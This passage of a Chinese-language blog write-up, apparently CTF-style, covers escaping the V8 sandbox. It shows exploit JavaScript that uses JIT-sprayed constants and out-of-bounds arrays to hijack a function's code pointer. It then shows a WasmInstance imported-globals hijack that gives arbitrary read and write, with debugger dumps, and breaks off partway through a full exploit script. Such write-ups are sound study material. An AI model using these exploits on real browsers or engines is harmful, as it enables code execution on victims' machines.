true);</span><br><span class="line">	return __dvCvt.getFloat64(0, true);</span><br><span class="line">&#125;</span><br><span class="line">function d22u(val)</span><br><span class="line">&#123; //double ==&gt; 2 * Uint32</span><br><span class="line">	__dvCvt.setFloat64(0, val, true);</span><br><span class="line">&#125;</span><br><span class="line">const hex = (x) =&gt; (&quot;0x&quot; + x.toString(16));</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">One weird thing is that as long as a function contains floating const,</span><br><span class="line">allocated array object cannot reach the function object by OOB;</span><br><span class="line">therefore, we use TypedArray arbitrary R/W in sbx to rewrite its field.</span><br><span class="line">*/</span><br><span class="line">const foo = ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">	return [</span><br><span class="line">        1.0,</span><br><span class="line">		1.95538254221075331056310651818E-246,</span><br><span class="line">		1.95606125582421466942709801013E-246,</span><br><span class="line">		1.99957147195425773436923756715E-246,</span><br><span class="line">		1.95337673326740932133292175341E-246,</span><br><span class="line">		2.63486047652296056448306022844E-284];</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++) &#123;</span><br><span class="line">	foo();foo();foo();foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const f = () =&gt; 123;</span><br><span class="line">const arr = [1.1];</span><br><span class="line">const o = &#123;x:0x1337, a:foo, b:f&#125;; // x makes a and b double align</span><br><span class="line">const ua = new Uint32Array(2);</span><br><span class="line"></span><br><span class="line">arr.setLength(36);</span><br><span class="line">d22u(arr[3]);</span><br><span class="line">const fooAddr = __dvCvt.getUint32(0, true);</span><br><span class="line">const fAddr = __dvCvt.getUint32(4, true);</span><br><span class="line">print(hex(fAddr));dp(f);</span><br><span class="line">dp(ua);</span><br><span class="line"></span><br><span class="line">function readOff(off)</span><br><span class="line">&#123;</span><br><span class="line">	arr[35] = u2d((off-7) * 0x100000000);</span><br><span class="line">	return ua[0];</span><br><span class="line">&#125;</span><br><span class="line">function writeOff(off, val)</span><br><span class="line">&#123;</span><br><span class="line">	arr[35] = u2d((off-7) * 0x100000000);</span><br><span class="line">	ua[0] = val;</span><br><span class="line">&#125;</span><br><span class="line">print(hex(fooAddr));dp(foo);</span><br><span class="line">jitAddr = readOff(fooAddr + 0x17);</span><br><span class="line">print(&apos;jitAddr&apos;);</span><br><span class="line">print(hex(jitAddr));</span><br><span class="line">print(&apos;rcx + 0x1b:&apos;) // rcx = jitAddr</span><br><span class="line">print(hex(jitAddr + 0x1b));</span><br><span class="line">print(hex(readOff(jitAddr + 0x1b)));</span><br><span class="line">// %SystemBreak();</span><br><span class="line">// writeOff(fAddr + 0x17, jitAddr + 0xb3 - 0x3f);</span><br><span class="line">writeOff(fAddr + 0x17, jitAddr + 0x7c);</span><br><span class="line">print(readOff(fooAddr + 0x17));</span><br><span class="line">dp(foo);</span><br><span class="line">// %SystemBreak();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<h2 id="方法二：利用-WasmInstance-的全局变量"><a href="#方法二：利用-WasmInstance-的全局变量" class="headerlink" title="方法二：利用 WasmInstance 的全局变量"></a>方法二：利用 WasmInstance 的全局变量</h2><p><em>（参考：<a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/" target="_blank" rel="noopener">https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/</a>）</em></p>
<p>尽管沙箱几乎把所有指针都压缩了，但依然存在一些64位的原始指针，可以尝试劫持它们来绕过沙箱。</p>
<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>WasmInstance 对象的 <code>imported_mutable_globals</code> 存储 WASM 代码中使用的所有全局变量，它并没有被沙箱保护起来。</p>
<p>下面是一个 WasmInstance 对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3b17081d2f3d: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x3b1708206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b1708046975 &lt;Object map = 0x3b1708206c81&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x3b1708048b69 &lt;Module map = 0x3b17082062d1&gt;</span><br><span class="line"> - exports_object: 0x3b1708048e85 &lt;Object map = 0x3b1708206d21&gt;</span><br><span class="line"> - native_context: 0x3b17081c2c75 &lt;NativeContext[266]&gt;</span><br><span class="line"> - imported_mutable_globals_buffers: 0x3b17081d3035 &lt;FixedArray[1]&gt;</span><br><span class="line"> - imported_function_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - indirect_function_table_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x3b1708048e61 &lt;Foreign&gt;</span><br><span class="line"> - managed object maps: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - feedback vectors: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - memory_start: (nil)</span><br><span class="line"> - memory_size: 0</span><br><span class="line"> - imported_function_targets: 0x560e9be53750</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x560e9be53770</span><br><span class="line"> - ...</span><br></pre></td></tr></table></figure>
<p>查看内存，<code>imported_mutable_globals</code> 确实还是64位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20xg 0x3b17081d2f3d-1</span><br><span class="line">0x3b17081d2f3c:	0x0800224908206439	0x0800224908002249</span><br><span class="line">0x3b17081d2f4c:	0x0000000008002249	0x0000000000000000</span><br><span class="line">0x3b17081d2f5c:	0x0000000000000000	0x0000560e9bddc640</span><br><span class="line">0x3b17081d2f6c:	0x0000560e9be53750	0x0000000000000000</span><br><span class="line">0x3b17081d2f7c:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x3b17081d2f8c:	0x0000560e9be53770	0x0000560e9bddc620</span><br><span class="line">0x3b17081d2f9c:	0x0000246bb5adb000	0x0000560e9bde8a48</span><br><span class="line">0x3b17081d2fac:	0x0000560e9bde8a40	0x0000560e9bde8a60</span><br><span class="line">0x3b17081d2fbc:	0x0000560e9bde8a58	0x0000560e9bddc630</span><br><span class="line">0x3b17081d2fcc:	0x0000560e9be53790	0x0000560e9be537b0</span><br></pre></td></tr></table></figure>
<h3 id="使用全局变量"><a href="#使用全局变量" class="headerlink" title="使用全局变量"></a>使用全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var global = new WebAssembly.Global(&#123;value:&apos;i64&apos;, mutable:true&#125;, 0n);</span><br><span class="line">var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod, &#123;js: &#123;global&#125;&#125;);</span><br></pre></td></tr></table></figure>
<p>以上可以往 <code>imported_mutable_globals</code> 里添加一个 int64 的全局变量 。</p>
<p>注意<code>global</code> 这个变量是在当前堆上分配的，利用漏洞是可以修改这个对象的属性。</p>
<p>DebugPrint 一下这个 <code>global</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0xc7908048d0d: [WasmGlobalObject]</span><br><span class="line"> - map: 0x0c7908206821 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - untagged_buffer: 0x0c7908048d31 &lt;ArrayBuffer map = 0xc7908203289&gt;</span><br><span class="line"> - offset: 0</span><br><span class="line"> - raw_type: 2</span><br><span class="line"> - is_mutable: 1</span><br><span class="line"> - type: i64</span><br><span class="line"> - is_mutable: 1</span><br></pre></td></tr></table></figure>
<p><code>untagged_buffer</code> 是一个 ArrayBuffer，<code>backing_store</code> 是 <code>0x3b1800002000</code> ，也就是 <code>global</code> 存储数据的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job 0x3b1708048d31</span><br><span class="line">0x3b1708048d31: [JSArrayBuffer]</span><br><span class="line"> - map: 0x3b1708203289 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b17081c99e9 &lt;Object map = 0x3b17082032b1&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x3b1800002000</span><br><span class="line"> - byte_length: 8</span><br><span class="line"> - max_byte_length: 8</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>回过头看上面 <code>wasm_instance</code> 的 <code>imported_mutable_globals</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3b17081d2f3d: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x3b1708206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b1708046975 &lt;Object map = 0x3b1708206c81&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x3b1708048b69 &lt;Module map = 0x3b17082062d1&gt;</span><br><span class="line"> - exports_object: 0x3b1708048e85 &lt;Object map = 0x3b1708206d21&gt;</span><br><span class="line"> - native_context: 0x3b17081c2c75 &lt;NativeContext[266]&gt;</span><br><span class="line"> - imported_mutable_globals_buffers: 0x3b17081d3035 &lt;FixedArray[1]&gt;</span><br><span class="line"> - imported_function_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - indirect_function_table_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x3b1708048e61 &lt;Foreign&gt;</span><br><span class="line"> - managed object maps: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - feedback vectors: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - memory_start: (nil)</span><br><span class="line"> - memory_size: 0</span><br><span class="line"> - imported_function_targets: 0x560e9be53750</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x560e9be53770</span><br><span class="line"> - ...</span><br></pre></td></tr></table></figure>
<p>这里的第一个元素即是 <code>global</code> 的 <code>backing_store</code> 地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10xg 0x560e9be53770</span><br><span class="line">0x560e9be53770:	0x00003b1800002000	0x00007fcdcb1bdca0</span><br><span class="line">0x560e9be53780:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x560e9be53790:	0x00007fcdcb1bdca0	0x00007fcdcb1bdca0</span><br><span class="line">0x560e9be537a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x560e9be537b0:	0x00007fcdcb1bdca0	0x00007fcdcb1bdca0</span><br></pre></td></tr></table></figure>
<p>我们伪造一个 <code>imported_mutable_globals</code> 替换掉 <code>wasm_instance</code> 的 <code>imported_mutable_globals</code> ，即可做到任意地址读写。</p>
<h3 id="伪造-imported-mutable-globals"><a href="#伪造-imported-mutable-globals" class="headerlink" title="伪造 imported_mutable_globals"></a>伪造 imported_mutable_globals</h3><p> <code>imported_mutable_globals</code> 并不是一个 JS 对象，不用泄漏 map ，伪造起来比较容易。</p>
<p>创建一个 <code>array</code> ，第一个元素是要读写的任意地址。</p>
<p>再泄漏这个 <code>array</code> 的偏移及基址 <code>js_base</code> 计算得到完整的 <code>array</code> 地址，覆盖掉用来的 <code>imported_mutable_globals</code> 。</p>
<p>泄漏 <code>array</code> 的偏移按常规的路子来就行，泄漏 <code>js_base</code> 见下一节。</p>
<p>一切搞好后，要读写任意地址，改 <code>array[0]</code> 即可。</p>
<h3 id="获取基址-js-base"><a href="#获取基址-js-base" class="headerlink" title="获取基址 js_base"></a>获取基址 js_base</h3><p>泄漏基址 <code>js_base</code> 并不难，多次运行 d8 ，搜索下基址：</p>
<p>第一次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x1c53</span><br><span class="line">[+] Searching &apos;\x53\x1c&apos; in memory</span><br><span class="line">[+] In (0x1c5300000000-0x1c5300003000), permission=rw-</span><br><span class="line">  0x1c530000001c - 0x1c5300000024  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c5300000024 - 0x1c530000002c  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c5300000054 - 0x1c530000005c  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c53000000f4 - 0x1c53000000fc  →   &quot;\x53\x1c[...]&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>第二次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x00002c3b</span><br><span class="line">[+] Searching &apos;\x3b\x2c\x00\x00&apos; in memory</span><br><span class="line">[+] In (0x2c3b00000000-0x2c3b00003000), permission=rw-</span><br><span class="line">  0x2c3b0000001c - 0x2c3b0000001e  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b00000024 - 0x2c3b00000026  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b00000054 - 0x2c3b00000056  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b000000f4 - 0x2c3b000000f6  →   &quot;;,&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>第三次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x3f13</span><br><span class="line">[+] Searching &apos;\x13\x3f&apos; in memory</span><br><span class="line">[+] In (0x3f1300000000-0x3f1300003000), permission=rw-</span><br><span class="line">  0x3f130000001c - 0x3f1300000024  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f1300000024 - 0x3f130000002c  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f1300000054 - 0x3f130000005c  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f13000000f4 - 0x3f13000000fc  →   &quot;\x13\x3f[...]&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，在 <code>[js_base , js_base+0x3000]</code> 的区间就有一些64位的原始指针，如果能读到，就可以泄漏出基址。</p>
<p>具体的方法，构造一个 <code>BigInt64Array</code> 修改 <code>external_pointer</code> ，以及 <code>byte_length</code> ，让 <code>BigInt64Array</code> 能从 <code>js_base</code> 开始访问。</p>
<p>这里由于沙箱，<code>data_ptr</code> 的计算方式改为 <code>js_base + base_pointer + (external_pointer &lt;&lt; 2)</code>  ，需要注意 <code>external_pointer</code> 变为了偏移，如下图的 <code>0x1000000</code> 。 </p>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2013.png" alt="Untitled"></p>
<p>修改 <code>external_pointer</code> 和 <code>base_pointer</code> 为 <code>0</code> ，<code>BigIng64Array</code> 就会从 <code>js_base</code> 开始访问了。</p>
<h3 id="修改全局变量"><a href="#修改全局变量" class="headerlink" title="修改全局变量"></a>修改全局变量</h3><p>参考 mdm 提供的 demo <a href="https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat" target="_blank" rel="noopener">https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat</a> ，添加修改 global 变量的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">   (global $g (import &quot;js&quot; &quot;global&quot;) (mut i64))</span><br><span class="line">   (func (export &quot;getGlobal&quot;) (result i64)</span><br><span class="line">        (global.get $g))</span><br><span class="line">   (func (export &quot;setGlobal&quot;) (param i64)</span><br><span class="line">        (global.set $g</span><br><span class="line">            (get_local 0)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>用 wat2wasm <a href="https://webassembly.github.io/wabt/demo/wat2wasm/" target="_blank" rel="noopener">https://webassembly.github.io/wabt/demo/wat2wasm/</a> 编译后，提取二进制格式的输出。</p>
<p>现在可以使用 WASM 修改全局变量了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x09,0x02,0x60,0x00,0x01,0x7e,0x60,0x01,0x7e,0x00,0x02,0x0e,0x01,0x02,0x6a,0x73,0x06,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x03,0x7e,0x01,0x03,0x03,0x02,0x00,0x01,0x07,0x19,0x02,0x09,0x67,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x00,0x09,0x73,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x01,0x0a,0x0d,0x02,0x04,0x00,0x23,0x00,0x0b,0x06,0x00,0x20,0x00,0x24,0x00,0x0b,0x00,0x14,0x04,0x6e,0x61,0x6d,0x65,0x02,0x07,0x02,0x00,0x00,0x01,0x01,0x00,0x00,0x07,0x04,0x01,0x00,0x01,0x67])</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code); </span><br><span class="line"></span><br><span class="line">const global = new WebAssembly.Global(&#123;value:&apos;i64&apos;, mutable:true&#125;, 0n);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod, &#123;js:&#123;global&#125;&#125;); </span><br><span class="line"></span><br><span class="line">var getGlobal= wasm_instance.exports.getGlobal;</span><br><span class="line">var setGlobal= wasm_instance.exports.setGlobal;</span><br><span class="line"></span><br><span class="line">setGlobal(0x10000n);</span><br><span class="line">console.log(getGlobal()); // 65535</span><br></pre></td></tr></table></figure>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dp</span>(<span class="params">x</span>) </span>&#123;&#125; </span><br><span class="line"><span class="comment">// function dp(x) &#123;%DebugPrint(x);&#125; // const print = console.log;</span></span><br><span class="line"><span class="keyword">const</span> print = <span class="function">(<span class="params">x</span>) =&gt;</span>&#123;<span class="built_in">console</span>.log(x)&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helpers</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a = <span class="keyword">new</span> BigUint64Array(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoi(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    itof(i) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoil(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoih(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fsetil(f, l) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fsetih(f, h) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetltof(i, l) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span 